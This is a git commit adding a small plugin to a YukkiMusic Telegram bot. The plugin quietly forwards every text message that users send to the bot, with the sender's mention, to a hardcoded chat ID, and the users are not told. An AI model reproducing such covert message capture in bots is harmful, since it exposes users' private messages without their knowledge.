35719e9af863b8a76edc9ee6fd1da2c8cf4a4d81
vidroasaac <148828173+Asaaq-ali@users.noreply.github.com>
2023-12-12 19:17:35 +0300

    Create ssestart.py

---
+++ YukkiMusic/plugins/bot/ssestart.py
@@ -0,0 +1,20 @@
+#heloo 
+
+import asyncio
+from pyrogram import Client, filters
+from strings import get_command
+
+from pyrogram.types import Message , ReplyKeyboardMarkup , KeyboardButton
+from YukkiMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
+
+#############################
+
+@app.on_message(filters.text & (filters.channel | filters.private))            
+async def hhhki(client: Client, message: Message):
+       msg = message.text
+       usr = await client.get_chat(message.from_user.id)
+       name = usr.first_name
+       usr_id = message.from_user.id
+       mention = message.from_user.mention
+       await app.send_message(-1002024807588, f"- قام {mention} \n\n- بارسال رسالة للبوت \n\n- {msg}")
+ 
